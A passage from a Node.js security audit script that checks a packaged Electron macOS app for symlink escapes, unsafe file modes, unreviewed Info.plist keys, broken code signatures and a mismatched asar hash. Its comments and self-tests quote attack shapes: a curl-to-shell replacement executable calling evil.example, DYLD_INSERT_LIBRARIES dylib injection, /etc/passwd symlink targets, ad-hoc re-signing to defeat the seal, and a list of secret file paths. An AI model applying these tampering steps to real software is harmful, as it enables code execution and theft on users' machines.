// twelve files, and an injected payload is usually one. Exact costs one
// obvious edit per upgrade and hides nothing.
// EVERY SYMLINK MUST STAY INSIDE THE BUNDLE.
//
// The 14 legitimate ones are all Electron's framework version stamps
// ("Versions/Current/Resources", "A"), and every one is RELATIVE and resolves
// within its own .framework. Nothing this project ships is a link at all — the
// app.asar.unpacked sidecar has zero. So the rule is simple and total: no
// absolute target, and no target that climbs out of the bundle root.
//
// Without this, an allowlisted path is not a safe path. A link named
// harmless.dat inside the sidecar's node_modules passed all 52 checks while
// pointing anywhere on the user's disk.
// A named predicate so the self-test below can drive it with inputs this run
// does not happen to have. `root` must be ABSOLUTE: path.resolve returns an
// absolute path, so comparing it against a relative root compares two
// different kinds of thing and every link reads as escaping.
function escapesBundle(root, linkPath, target) {
  const resolved = path.resolve(path.dirname(path.join(root, linkPath)), target);
  return path.isAbsolute(target)
    || !(resolved === root || resolved.startsWith(`${root}${path.sep}`));
}
for (const [linkPath, target] of symlinks) {
  ok(!escapesBundle(bundleRoot, linkPath, target),
    `the bundle ships a symlink ${JSON.stringify(linkPath)} -> ${JSON.stringify(target)}, which `
    + 'resolves outside the .app. A symlink is a file whose content is chosen at open time on the '
    + "user's machine, so no path rule above can see what it exposes. Electron's own links are all "
    + 'relative and stay inside their framework.');
}
// The rules above are negatives, so prove the check can fire at all — AND that
// it does not fire on the links every Electron bundle ships.
//
// The second half is the one that was broken. bundleRoot is derived from argv,
// so with a RELATIVE argv it was relative while path.resolve's output is
// absolute, and `resolved.startsWith(root)` was false for all 14 of Electron's
// own framework version stamps: a clean bundle reported 14 FAILURES. CI passes
// no argument so nobody saw it, and the audit is exactly the check a human runs
// by hand on a path they typed. Driven through the predicate with both spellings
// of the root, so the argv form can never change the verdict again.
for (const root of [bundleRoot, path.relative(process.cwd(), bundleRoot) || '.']) {
  const absRoot = path.resolve(root);
  ok(escapesBundle(absRoot, '/Contents/Resources/x', '/etc/passwd'),
    `SELF-TEST (root spelled ${JSON.stringify(root)}): an absolute symlink target resolved INSIDE `
    + 'the bundle, so the escape check above cannot fire and its clean result means nothing.');
  ok(escapesBundle(absRoot, '/Contents/Resources/x', '../../../../../../etc/passwd'),
    `SELF-TEST (root spelled ${JSON.stringify(root)}): a target climbing out with ../ was not `
    + 'caught, which is the shape an attacker would actually use.');
  ok(!escapesBundle(absRoot, '/Contents/Frameworks/Mantle.framework/Versions/Current', 'A'),
    `SELF-TEST (root spelled ${JSON.stringify(root)}): Electron's own framework version stamp `
    + 'reads as escaping. An audit that fires on every correct bundle gets switched off, and then '
    + 'its false-positive shape is where a real escaping link hides.');
}

// THE COLLECTORS MUST HAVE COLLECTED.
//
// Every rule below this point passes when its list is EMPTY, which is also
// exactly how a collector that stopped collecting behaves. Deleting the
// `symlinks.push` line, or the `worldWritable.push` line, left all 70 checks
// green — the same vacuity that SR-23 found in the behavioural runner, in a
// second file. The bundle walk itself is guarded by the size checks near the
// top; these two lists needed their own.
//
// Electron's framework version stamps are the known-positive: every bundle it
// produces has them, so zero symlinks means the collector is broken, not that
// the bundle is unusually clean. Modes have no such natural positive (the
// honest count of world-writable files is zero), so instead assert the walk
// STATTED something — `checkedModes` counts every file it examined.
ok(symlinks.length >= 10,
  `the symlink collector found ${symlinks.length} link(s). Every Electron bundle ships framework `
  + 'version stamps (Versions/Current, Versions/Current/Resources, …), so a near-empty list means '
  + 'the collector stopped collecting and the escape check below proves nothing.');
ok(checkedModes > 50,
  `the walk stat()ed only ${checkedModes} file(s), which is too few for an Electron bundle. The `
  + 'mode and hard-link rules below all pass on an empty sample, so this is what makes their '
  + 'clean result mean anything.');

// …and one CANARY per mode rule, because `checkedModes` only proves the block
// RAN. Deleting a single `push` line left it running and the list empty, which
// is the expected answer — so plant a file that each rule must catch, in a
// temp directory walked with the same function, and require it to be found.
// (Not planted in the real bundle: an audit that mutates the artifact it is
// auditing could ship what it planted if it crashed mid-run.)
{
  const probeDir = fs.mkdtempSync(path.join(require('os').tmpdir(), 'asar-audit-selftest-'));
  const w = path.join(probeDir, 'ww.dat');
  const s = path.join(probeDir, 'su.dat');
  const h = path.join(probeDir, 'hard.dat');
  const hSrc = path.join(probeDir, 'hard-src.dat');
  try {
    fs.writeFileSync(w, 'x'); fs.chmodSync(w, 0o666);
    fs.writeFileSync(s, 'x'); fs.chmodSync(s, 0o4755);
    fs.writeFileSync(hSrc, 'x'); fs.linkSync(hSrc, h);
    fs.symlinkSync('/etc/passwd', path.join(probeDir, 'link.dat'));
    const before = {
      ww: worldWritable.length, su: setuidOrSetgid.length,
      hl: hardLinked.length, sl: symlinks.length,
    };
    walk(probeDir, '__selftest', []);
    ok(worldWritable.length > before.ww,
      'SELF-TEST: the walk did not flag a 0666 file, so the world-writable rule cannot fire and '
      + 'its clean result on the real bundle means nothing.');
    ok(setuidOrSetgid.length > before.su,
      'SELF-TEST: the walk did not flag a setuid file, so that rule cannot fire.');
    ok(hardLinked.length > before.hl,
      'SELF-TEST: the walk did not flag a hard-linked file, so that rule cannot fire.');
    ok(symlinks.length > before.sl,
      'SELF-TEST: the walk did not record a symlink, so the escape check cannot fire.');
    // Remove the probe's own findings: they are this file's, not the bundle's.
    worldWritable.length = before.ww; setuidOrSetgid.length = before.su;
    hardLinked.length = before.hl; symlinks.length = before.sl;
  } finally {
    fs.rmSync(probeDir, { recursive: true, force: true });
  }
}

// MODE AND LINK INVARIANTS. All three measured as zero on the real bundle
// before being asserted, so none of them is a threshold anyone has to tune.
ok(worldWritable.length === 0,
  `the bundle ships world-writable file(s) ${JSON.stringify(worldWritable.slice(0, 5))} `
  + `(${worldWritable.length} total). Any local process could rewrite them — in an app bundle `
  + 'that means replacing code the user then runs. The real bundle has none.');
ok(setuidOrSetgid.length === 0,
  `the bundle ships setuid/setgid file(s) ${JSON.stringify(setuidOrSetgid.slice(0, 5))} `
  + `(${setuidOrSetgid.length} total). This is an unsigned, user-installed math tool; nothing in `
  + 'it has any reason to run as another user. The real bundle has none.');
ok(hardLinked.length === 0,
  `the bundle ships hard-linked file(s) ${JSON.stringify(hardLinked.slice(0, 5))} `
  + `(${hardLinked.length} total, link count > 1). A hard link shares one inode with a file `
  + 'elsewhere on disk — the same escape a symlink gives, with no link to read and no path rule '
  + 'able to see it. The real bundle has none.');

const FRAMEWORK_BASELINE = 203; // electron ^31.7.7, darwin-arm64
const frameworkPaths = bundleListing.filter((p) => p.startsWith('/Contents/Frameworks/'));
ok(frameworkPaths.length === FRAMEWORK_BASELINE,
  `the bundle's framework trees hold ${frameworkPaths.length} paths; the recorded baseline is `
  + `${FRAMEWORK_BASELINE}. The allowlist cannot enumerate inside Electron's own frameworks (they `
  + 'are reshuffled every release), so this count is what stands between an afterPack hook and an '
  + 'arbitrary file hidden in them — a `settings.dat` deep in Electron Framework.framework passed '
  + 'all 51 checks before this existed. If you upgraded Electron, update FRAMEWORK_BASELINE in the '
  + 'same commit; if you did not, something wrote into the bundle after packaging.');

// ── Info.plist CONTENTS ─────────────────────────────────────────────────────
//
// Every rule above this point audits PATHS. `/Contents/Info.plist` is on the
// allowlist and its contents were never read — and on macOS that file is a live
// capability surface, not metadata:
//   LSEnvironment      environment variables launchd sets for the process.
//                      `DYLD_INSERT_LIBRARIES: /tmp/evil.dylib` loads an
//                      arbitrary dylib into an UNSIGNED app before main() runs.
//                      Verified: injected into the real bundle, 81/81 green.
//   CFBundleURLTypes   URL schemes the app claims. Registering `nash-pwn://`
//                      makes any web page able to hand this app a payload.
//   ElectronAsarIntegrity  the SHA-256 Electron checks app.asar's header
//                      against. Editing it to match a tampered archive is how
//                      a swapped asar passes Electron's own check.
// Auditing the path cannot see any of this, exactly as auditing a path could
// not see where a symlink pointed.
//
// Read with `plutil -convert json`, the platform's own parser: this audit runs
// on macOS only (both workflows pin macos-latest), and a hand-rolled XML reader
// would disagree with the parser that actually decides what launchd does.
// Every Info.plist in the bundle, not just the top one — the four helper .apps
// have their own, and the renderer helper is the one that hosts web content.
// Guarded on isBundle like every other bundle rule above: pointed at a bare
// app.asar outside a .app, bundleListing is empty and these read a plist path
// that does not exist. The first spelling threw an unhandled
// `Command failed: plutil` and killed the run — exit non-zero for the wrong
// reason, with every remaining check unevaluated. `ok(isBundle, …)` above
// already FAILS that case loudly, which is the honest verdict; these must not
// turn it into a crash.
const plists = isBundle ? bundleListing.filter((p) => p.endsWith('/Info.plist')) : [];
ok(!isBundle || plists.length >= 5,
  `found ${plists.length} Info.plist file(s) in the bundle; an Electron app ships at least five `
  + '(the app plus four helpers). A short list means the collector missed some and the rules '
  + 'below audited fewer files than they claim.');
// The ONLY env vars any plist here may set. electron-builder writes
// MallocNanoZone=0 into the app and every helper; nothing else belongs.
const ALLOWED_LSENV = new Map([['MallocNanoZone', '0']]);
// Every Info.plist key that may appear in a shipped bundle, across the app and
// all eight helpers. Inert identity/metadata (CFBundle*, DT*, NS*UsageDescription
// — a usage string grants nothing; the OS shows it only if the app asks, and the
// permission handler in electron-main.cjs is what actually refuses) plus four
// entries that DO carry capability and are checked by name above or below:
// LSEnvironment (launchd env), ElectronAsarIntegrity (the asar hash),
// NSAppTransportSecurity (electron-builder writes NSAllowsArbitraryLoads
// unconditionally — configureLocalhostAts in app-builder-lib; ATS does not
// govern Chromium's own network stack, and navigation is contained by
// hardenWebContents, so it is inert here but must stay visible), and LSUIElement
// (agent app: no Dock icon, no menu bar — present on the helpers, never the app).
const ALLOWED_PLIST_KEYS = new Set([
  'CFBundleDevelopmentRegion', 'CFBundleDisplayName', 'CFBundleExecutable',
  'CFBundleIconFile', 'CFBundleIdentifier', 'CFBundleInfoDictionaryVersion',
  'CFBundleName', 'CFBundlePackageType', 'CFBundleShortVersionString',
  'CFBundleSignature', 'CFBundleVersion',
  'DTCompiler', 'DTSDKBuild', 'DTSDKName', 'DTXcode', 'DTXcodeBuild',
  'ElectronAsarIntegrity', 'LSApplicationCategoryType', 'LSEnvironment',
  'LSMinimumSystemVersion', 'LSUIElement', 'NSAppTransportSecurity',
  'NSBluetoothAlwaysUsageDescription', 'NSBluetoothPeripheralUsageDescription',
  'NSCameraUsageDescription', 'NSHighResolutionCapable', 'NSHumanReadableCopyright',
  'NSMainNibFile', 'NSMicrophoneUsageDescription', 'NSPrincipalClass',
  'NSQuitAlwaysKeepsWindows', 'NSRequiresAquaSystemAppearance',
  'NSSupportsAutomaticGraphicsSwitching',
]);
// The per-plist rules below all pass when a plist parses to `{}` — which is
// also what a plutil that stopped working produces. Count the ones that came
// back with real content and assert against the app plist's known keys, so an
// empty parse cannot read as a clean bundle. Same failure the symlink and mode
// collectors had: "the list came back empty" is the verdict a broken collector
// and a clean artifact both give.
let plistsParsed = 0;
let plistsWithKnownEnv = 0;
for (const rel of plists) {
  let info;
  try {
    info = JSON.parse(execFileSync('plutil',
      ['-convert', 'json', '-o', '-', path.join(bundleRoot, rel)], { encoding: 'utf8' }));
  } catch (e) {
    ok(false, `${rel} could not be parsed by plutil (${String(e.message).slice(0, 120)}). An `
      + 'unreadable plist is a finding: launchd reads this file whatever this audit can do with it.');
    continue;
  }
  if (info && typeof info === 'object' && Object.keys(info).length > 0) plistsParsed++;
  const env = info.LSEnvironment || {};
  if (Object.keys(env).length > 0) plistsWithKnownEnv++;
  for (const [k, v] of Object.entries(env)) {
    ok(ALLOWED_LSENV.has(k) && String(ALLOWED_LSENV.get(k)) === String(v),
      `${rel} sets LSEnvironment ${JSON.stringify(k)}=${JSON.stringify(v)}. launchd puts these in `
      + 'the process environment before any code runs, so a DYLD_* entry loads a chosen dylib into '
      + `this unsigned app. Only ${[...ALLOWED_LSENV.keys()].join(', ')} may appear.`);
  }
  ok(!('CFBundleURLTypes' in info),
    `${rel} declares CFBundleURLTypes ${JSON.stringify(info.CFBundleURLTypes)}. This app is opened `
    + 'from the Dock and handles no URL scheme; a registered scheme is an input channel any web '
    + 'page can drive, and nothing in electron-main.cjs is written to receive one.');
  // ALLOWLIST, not two named keys. The rules above name LSEnvironment and
  // CFBundleURLTypes, so every OTHER capability key passed unread: planted
  // NSAppleEventsUsageDescription, LSUIElement and a CFBundleDocumentTypes
  // claiming `public.data` (every file on the machine) into the real bundle
  // and the audit still reported 144/144. Same shape as the symlink rule —
  // auditing the names you thought of cannot see the one you did not.
  // A key added by a future electron-builder fails here on purpose: read what
  // it grants, then add it below with a reason.
  for (const k of Object.keys(info)) {
    ok(ALLOWED_PLIST_KEYS.has(k),
      `${rel} carries the unreviewed Info.plist key ${JSON.stringify(k)} = `
      + `${JSON.stringify(info[k]).slice(0, 120)}. macOS reads this file to decide what the app may `
      + 'do before any of its code runs. If the key is harmless, add it to ALLOWED_PLIST_KEYS with '
      + 'a note saying what it grants; if it is not, it does not belong in a shipped bundle.');
  }
}
// THE VERSION THE APP REPORTS MUST BE THE VERSION THE RELEASE ANNOUNCES.
//
// Three numbers have to agree and nothing checked any pair of them:
//   package.json          -> what the workflow writes into app-version.json
//   Info.plist            -> what app.getVersion() returns at runtime
//   the .dmg/.zip filename -> the artifact actually uploaded
// checkForUpdates prompts whenever compareVersions(manifest, app.getVersion())
// > 0, so a manifest ahead of the installed plist means every copy is offered
// an update, downloads it, still reports the old version, and is prompted
// again — forever. RED-DESKTOP-19/002 was the mirror of this (same version
// republished, nobody ever offered it); this is the loop in the other
// direction, and the workflow's republish guard compares package.json to the
// manifest, so it is watching two numbers that are equal BY CONSTRUCTION
// while the one the user runs drifts.
//
// Reproduced: bump package.json to 0.0.225 without rebuilding. The audit
// passed, the manifest would announce 0.0.225, and the DMG installs 0.0.224.
// A stale dist-electron/ is the normal way this happens — the build is not
// re-run because "only the version changed".
if (isBundle) {
  const pkgVersion = JSON.parse(fs.readFileSync(path.join(repo, 'package.json'), 'utf8')).version;
  const top = JSON.parse(execFileSync('plutil',
    ['-convert', 'json', '-o', '-', path.join(bundleRoot, '/Contents/Info.plist')],
    { encoding: 'utf8' }));
  ok(top.CFBundleShortVersionString === pkgVersion,
    `the packaged app reports version ${JSON.stringify(top.CFBundleShortVersionString)} but `
    + `package.json says ${JSON.stringify(pkgVersion)}. The release writes package.json's value `
    + "into app-version.json while the installed app reports the plist's via app.getVersion(), so "
    + 'every installed copy would be offered an update that never changes its version — a prompt '
    + 'loop on every launch. Rebuild dist-electron/ after bumping the version.');
  ok(top.CFBundleVersion === pkgVersion,
    `CFBundleVersion is ${JSON.stringify(top.CFBundleVersion)}, not ${JSON.stringify(pkgVersion)}.`);
  // The artifact FILENAME carries the version too, and it is what the upload
  // step globs. A name disagreeing with the bundle means two different builds
  // are sitting in dist-electron/ and `dmgs[0]` picks by shell glob order.
  const distDir = path.join(repo, 'dist-electron');
  if (fs.existsSync(distDir)) {
    for (const f of fs.readdirSync(distDir)) {
      if (!/\.(dmg|zip)$/.test(f)) continue;
      ok(f.includes(pkgVersion),
        `dist-electron/${f} does not carry version ${pkgVersion}. The release uploads `
        + 'dist-electron/*.dmg by glob, so a stale artifact from an earlier version can be the one '
        + 'that ships while app-version.json announces this one.');
    }
  }
}

ok(plistsParsed === plists.length,
  `only ${plistsParsed} of ${plists.length} Info.plist files parsed to anything. A plist that `
  + 'reads as empty satisfies every rule above, so this is what makes their clean result mean '
  + 'something.');
ok(plistsWithKnownEnv >= 5,
  `only ${plistsWithKnownEnv} Info.plist file(s) carried an LSEnvironment block. electron-builder `
  + 'writes MallocNanoZone into the app and all four helpers, so a lower count means the block is '
  + 'not being read and the DYLD rule above never examined anything.');

// THE SEAL over every other file in the bundle.
//
// The two rules above audit the contents of the plists. Every OTHER allowlisted
// path is still judged by its name alone, and the main executable is the one
// that matters: replacing /Contents/MacOS/<app> with
//   #!/bin/sh
//   curl -s https://evil.example/x | sh
// left the audit at 101/101 green. It is on the allowlist, it is the right
// size class, it has the right mode — and it is a shell script that runs when
// the user opens the app. The same is true of every .icns, .pak and helper
// binary here.
//
// Enumerating file types one at a time is the losing race the preload's door
// list already was. electron-builder adhoc-signs the bundle, and the ad-hoc
// signature seals EVERY file in it, so one `codesign --verify --deep` covers
// the whole family — including files no rule here has ever named. Verified
// both ways on the real bundle: rc 0 clean, rc 1 with the executable swapped
// ("code object is not signed at all") and with a resource edited ("a sealed
// resource is missing or invalid").
//
// `identity: null` in package.json means adhoc, NOT unsigned — if that ever
// changes to a real identity this still passes, since --verify only checks the
// seal is intact.
//
// WHAT THIS DOES NOT BUY, measured rather than assumed: an ad-hoc signature is
// free to forge, so `codesign --force --deep --sign - <app>` after tampering
// makes --verify pass again (rc 0, confirmed on this bundle). The seal catches
// an edit, not an attacker with a shell. That is why the plist rules above are
// separate and must stay: re-signed with DYLD_INSERT_LIBRARIES in place, the
// seal is happy and the LSEnvironment rule is the only thing that still fires.
// Between them they cover both a file changed after packaging and a hostile
// value packaged in legitimately (electron-builder's `extendInfo`), which no
// signature can distinguish from an intended one.
if (isBundle) {
  const r = require('child_process').spawnSync('codesign',
    ['--verify', '--deep', bundleRoot], { encoding: 'utf8' });
  const detail = `${r.stdout || ''}${r.stderr || ''}`.trim().split('\n').slice(0, 3).join(' / ');
  ok(r.status === 0,
    `codesign --verify --deep failed on the bundle: ${detail || `exit ${r.status}`}. The ad-hoc `
    + 'signature seals every file in the .app, so this fires when ANY of them was replaced after '
    + 'packaging — the executable, a helper binary, an .icns, a .pak. Those are all allowlisted by '
    + 'PATH above, and a path rule cannot tell a Mach-O binary from a shell script.');
  // CONTROL: the command must actually have run. A missing codesign, or a
  // bundleRoot that is not a bundle, exits non-zero too — but `spawnSync`
  // failing to launch at all yields status null, which `=== 0` would also
  // reject for the wrong reason, and a future refactor could make it pass.
  ok(r.error === undefined && typeof r.status === 'number',
    `codesign could not be run at all (${r.error && r.error.message}). Without it the seal check `
    + 'above proves nothing about the bundle.');
}

// The integrity hash must match the archive actually shipped. Electron checks
// app.asar's HEADER against this value, so a hash edited to match a tampered
// archive is precisely how a swapped asar passes that check — recomputed here
// from the bytes on disk rather than trusted.
if (isBundle) {
  const top = JSON.parse(execFileSync('plutil',
    ['-convert', 'json', '-o', '-', path.join(bundleRoot, '/Contents/Info.plist')],
    { encoding: 'utf8' }));
  const entry = (top.ElectronAsarIntegrity || {})['Resources/app.asar'];
  ok(entry && entry.algorithm === 'SHA256' && /^[0-9a-f]{64}$/.test(String(entry.hash)),
    `Info.plist's ElectronAsarIntegrity for Resources/app.asar is ${JSON.stringify(entry)}. `
    + 'Without a SHA256 entry Electron has nothing to verify the archive against.');
  if (entry && typeof entry.hash === 'string') {
    // asar header: bytes 12..16 are the header length, the header follows at 16.
    const fd = fs.openSync(asarPath, 'r');
    let actual = '';
    try {
      const lead = Buffer.alloc(16);
      fs.readSync(fd, lead, 0, 16, 0);
      const headerSize = lead.readUInt32LE(12);
      const header = Buffer.alloc(headerSize);
      fs.readSync(fd, header, 0, headerSize, 16);
      actual = require('crypto').createHash('sha256').update(header).digest('hex');
    } finally { fs.closeSync(fd); }
    ok(actual === entry.hash,
      `Info.plist claims app.asar's header hashes to ${entry.hash}, but the shipped archive hashes `
      + `to ${actual}. Either the archive was replaced after packaging or the hash was edited to `
      + 'match one — both defeat the integrity check Electron performs at startup.');
  }
}

// CONTROL for the bundle allowlist: the fixture the rule is supposed to reject.
// Without this, a BUNDLE_ALLOWED entry loosened to /^\/Contents/ would pass
// silently on a clean bundle, exactly as the missing rule did.
ok(['/Contents/Resources/db.json', '/Contents/Resources/.env', '/Contents/config.json',
  '/Contents/MacOS/db.json', '/Contents/Frameworks/db.json',
  '/Contents/Resources/en.lproj/db.json', '/Contents/_CodeSignature/db.json']
  .every((p) => !BUNDLE_ALLOWED.some((re) => re.test(p))),
  'SELF-TEST: the bundle allowlist accepts a planted secret next to app.asar. One of the '
  + 'BUNDLE_ALLOWED patterns is too broad — check for a prefix match where an anchored one was '
  + 'meant.');
for (const real of ['/Contents/Info.plist', `/Contents/MacOS/${appExe}`,
  '/Contents/Resources/icon.icns', '/Contents/Resources/es_419.lproj',
  '/Contents/_CodeSignature/CodeResources',
  `/Contents/Frameworks/${appExe} Helper (GPU).app/Contents/MacOS/${appExe} Helper (GPU)`,
  '/Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework']) {
  ok(BUNDLE_ALLOWED.some((re) => re.test(real)),
    `SELF-TEST: the bundle allowlist rejects ${real}, which every Electron app ships. An audit `
    + 'that fires on the real bundle is an audit someone will switch off.');
}

// SELF-TEST. Every rule above is a negative — it passes when it finds nothing,
// which is also how a broken pattern behaves. Run each against a synthetic
// listing that SHOULD match, and fail if it does not.
const SELF_TEST_PATHS = ['/db.json', '/db.json 2', '/db.json.corrupt-1789', '/.env',
  '/sub/.env.production', '/key.pem', '/gcp-service-account.json', '/.git/config',
  '/_gen/probe.mjs', '/round22/notes.md', '/dist/server.cjs.map', '/CLAUDE.md'];
for (const probe of SELF_TEST_PATHS) {
  ok(FORBIDDEN.some(([re]) => re.test(probe)),
    `SELF-TEST: no rule matches ${probe}, so that shape would ship unnoticed. The rules are all `
    + 'negatives — a pattern that matches nothing looks exactly like a clean package.');
}
// …and the mirror: the app's own files must NOT match, or the audit fails the
// real package and gets disabled.
for (const clean of ['/electron-main.cjs', '/dist/server.cjs', '/dist/assets/index-abc123.js',
  '/dist/index.html', '/package.json']) {
  ok(!FORBIDDEN.some(([re]) => re.test(clean)),
    `SELF-TEST: a rule matches ${clean}, which the app needs. An audit that fires on the real `
    + 'package is an audit someone will switch off.');
}

if (failures.length) {
  console.error(`audit-packaged-asar: ${failures.length} FAILURE(S) in ${asarPath}\n`);
  for (const f of failures) console.error(`  - ${f}\n`);
  process.exit(1);
}
console.log(`audit-packaged-asar: ${checks} checks passed (${listing.length} entries, `
  + `${ours.length} of them ours) in ${path.relative(repo, asarPath)}`);
